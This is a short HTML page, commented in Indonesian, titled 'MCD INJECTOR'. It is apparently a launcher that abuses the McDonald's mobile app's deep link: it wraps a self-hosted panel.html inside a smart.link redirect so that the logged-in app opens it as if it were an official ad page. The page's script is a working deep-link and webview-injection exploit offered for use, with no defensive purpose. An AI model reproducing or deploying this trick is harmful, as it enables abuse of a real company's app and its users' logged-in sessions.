<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>McD Launcher Pro</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding: 50px 20px; background: #da291c; color: white; }
        .btn { background: #ffbc0d; color: #222; border: none; padding: 20px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://www.mcdonalds.co.id/assets/img/common/mcdonalds_logo.png" width="80">
    <h2>MCD INJECTOR</h2>
    <p>Pastikan sudah LOGIN di aplikasi McD</p>
    <button class="btn" onclick="gas()">BUKA PANEL INTERNAL</button>

    <script>
        function gas() {
            // 1. Ambil URL panel.html kamu secara otomatis
            var currentPath = window.location.href.split('index.html')[0];
            var myPanel = currentPath + "panel.html";
            
            // 2. RAHASIA MUKIDI: Kita bungkus URL kita di dalam 'smart.link'
            // agar aplikasi menganggap ini adalah link iklan resmi
            var gateway = "https://smart.link/2le1hb5pjyoo9?weburl=" + encodeURIComponent(myPanel);
            
            // 3. Pemicu Deep Link
            var trigger = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(gateway);
            
            window.location.href = trigger;
        }
    </script>
</body>
</html>
